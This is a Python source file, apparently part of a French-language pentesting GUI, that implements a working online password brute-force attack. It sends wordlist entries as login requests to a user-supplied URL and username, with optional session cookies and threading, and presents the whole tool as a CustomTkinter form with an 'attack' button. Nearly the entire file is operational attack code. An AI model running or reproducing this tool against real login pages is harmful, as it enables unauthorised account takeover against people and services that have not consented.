import requests
from tkinter import filedialog, messagebox
import customtkinter as ctk
from concurrent.futures import ThreadPoolExecutor
from itertools import islice

from shared import navigate_to_page  # Si nécessaire pour réinitialiser la page


def brute_force_attack(url, username, password_file, login_failed_string, cookie_value=None, threads=10, chunk_size=100):
    """
    Attaque brute force optimisée avec threading et lecture par lots.

    :param url: URL cible pour l'attaque.
    :param username: Nom d'utilisateur à bruteforcer.
    :param password_file: Fichier contenant les mots de passe à tester.
    :param login_failed_string: Chaîne qui indique un échec de connexion.
    :param cookie_value: Valeur optionnelle pour un cookie.
    :param threads: Nombre de threads simultanés.
    :param chunk_size: Nombre de mots de passe à traiter par thread.
    :return: Message de succès ou échec.
    """
    def try_login(passwords_chunk):
        """Teste une liste de mots de passe en parallèle."""
        for password in passwords_chunk:
            password = password.strip()
            data = {'username': username, 'password': password, 'Login': 'submit'}
            try:
                # Envoi de la requête
                if cookie_value:
                    response = requests.get(url, params=data, cookies={'Cookie': cookie_value})
                else:
                    response = requests.post(url, data=data)

                # Analyse de la réponse
                if login_failed_string not in response.content.decode():
                    success_message = f"[+] Found Username: {username}\n[+] Found Password: {password}"
                    print(success_message)
                    return success_message
            except Exception as e:
                print(f"Erreur lors du test du mot de passe {password}: {e}")
        return None

    # Lecture optimisée et bruteforce
    try:
        with open(password_file, 'r') as file:
            passwords = (line.strip() for line in file)
            while True:
                chunk = list(islice(passwords, chunk_size))
                if not chunk:
                    break

                # Multithreading
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    results = list(executor.map(try_login, [chunk]))
                    for result in results:
                        if result:
                            return result

        return "[!!] Password Not In List"
    except Exception as e:
        return f"An error occurred: {e}"

# ----------------------------
# Interface graphique : CustomTkinter
# ----------------------------
def show_brute_force_page(container):
    """Affiche la page d'attaque par Brute Force dans le conteneur donné."""
    # Effacer le contenu existant dans le conteneur
    for widget in container.winfo_children():
        widget.destroy()

    # Colonne pour l'historique
    vuln_list_frame = ctk.CTkFrame(container, fg_color="#1e1e1e", width=300)
    vuln_list_frame.pack(side="left", fill="y", padx=10, pady=10)

    vuln_list_label = ctk.CTkLabel(vuln_list_frame, text="Historique des attaques", text_color="white", font=("Helvetica", 16))
    vuln_list_label.pack(pady=10)

    vuln_list = ctk.CTkTextbox(vuln_list_frame, fg_color="#2e2e2e", text_color="white", font=("Helvetica", 14), wrap="none", state="disabled")
    vuln_list.pack(fill="both", expand=True)

    # Zone principale
    main_frame = ctk.CTkFrame(container, fg_color="#2e2e2e")
    main_frame.pack(side="right", fill="both", expand=True, padx=10, pady=10)

    # Barre pour entrer l'URL
    url_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
    url_frame.pack(pady=5, padx=20, anchor="n", fill="x")

    url_label = ctk.CTkLabel(url_frame, text="URL cible :", text_color="white", font=("Helvetica", 14))
    url_label.pack(side="left", padx=5)

    url_entry = ctk.CTkEntry(url_frame, font=("Helvetica", 14), width=400)
    url_entry.pack(side="left", padx=5, fill="x", expand=True)

    # Barre pour entrer le nom d'utilisateur
    username_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
    username_frame.pack(pady=5, padx=20, anchor="n", fill="x")

    username_label = ctk.CTkLabel(username_frame, text="Nom d'utilisateur :", text_color="white", font=("Helvetica", 14))
    username_label.pack(side="left", padx=5)

    username_entry = ctk.CTkEntry(username_frame, font=("Helvetica", 14), width=400)
    username_entry.pack(side="left", padx=5, fill="x", expand=True)

    # Sélectionner le fichier de mots de passe
    password_file_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
    password_file_frame.pack(pady=5, padx=20, anchor="n", fill="x")

    password_file_label = ctk.CTkLabel(password_file_frame, text="Fichier de mots de passe :", text_color="white", font=("Helvetica", 14))
    password_file_label.pack(side="left", padx=5)

    password_file_entry = ctk.CTkEntry(password_file_frame, font=("Helvetica", 14), width=400)
    password_file_entry.pack(side="left", padx=5, fill="x", expand=True)

    def browse_file():
        file_path = filedialog.askopenfilename(title="Sélectionner un fichier de mots de passe", filetypes=[("Text Files", "*.txt")])
        if file_path:
            password_file_entry.insert(0, file_path)

    browse_button = ctk.CTkButton(password_file_frame, text="Parcourir", command=browse_file)
    browse_button.pack(side="left", padx=5)

    # Barre pour entrer la chaîne d'échec
    login_failed_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
    login_failed_frame.pack(pady=5, padx=20, anchor="n", fill="x")

    login_failed_label = ctk.CTkLabel(login_failed_frame, text="Chaîne d'échec :", text_color="white", font=("Helvetica", 14))
    login_failed_label.pack(side="left", padx=5)

    login_failed_entry = ctk.CTkEntry(login_failed_frame, font=("Helvetica", 14), width=400)
    login_failed_entry.pack(side="left", padx=5, fill="x", expand=True)

    # Barre pour entrer la valeur du cookie (optionnel)
    cookie_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
    cookie_frame.pack(pady=5, padx=20, anchor="n", fill="x")

    cookie_label = ctk.CTkLabel(cookie_frame, text="Valeur du cookie (optionnel) :", text_color="white", font=("Helvetica", 14))
    cookie_label.pack(side="left", padx=5)

    cookie_entry = ctk.CTkEntry(cookie_frame, font=("Helvetica", 14), width=400)
    cookie_entry.pack(side="left", padx=5, fill="x", expand=True)

    # Zone des résultats
    results_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
    results_frame.pack(pady=10, padx=20, fill="both", expand=True)

    results_textbox = ctk.CTkTextbox(
        results_frame,
        fg_color="#1e1e1e",
        text_color="white",
        font=("Helvetica", 14),
        wrap="word",
        state="normal",
    )
    results_textbox.pack(fill="both", pady=10, padx=20, expand=True)
    results_textbox.configure(state="disabled")  # Initialement désactivé pour être vide

    # Boutons en bas
    bottom_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
    bottom_frame.pack(side="bottom", fill="x", pady=10, padx=20)

    # Bouton pour lancer l'attaque
    def run_brute_force():
        url = url_entry.get()
        username = username_entry.get()
        password_file = password_file_entry.get()
        login_failed_string = login_failed_entry.get()
        cookie_value = cookie_entry.get()

        if not url or not username or not password_file or not login_failed_string:
            messagebox.showerror("Erreur", "Tous les champs obligatoires doivent être remplis.")
            return

        results_textbox.delete("1.0", "end")
        results_textbox.insert("end", f"Lancement de l'attaque brute force sur {url}...\n")

        result = brute_force_attack(url, username, password_file, login_failed_string, cookie_value)
        results_textbox.insert("end", result)

    attack_button = ctk.CTkButton(
        bottom_frame, text="Lancer l'attaque", command=run_brute_force, fg_color="#D32F2F", hover_color="#C62828", font=("Helvetica", 16)
    )
    attack_button.pack(side="right", padx=5)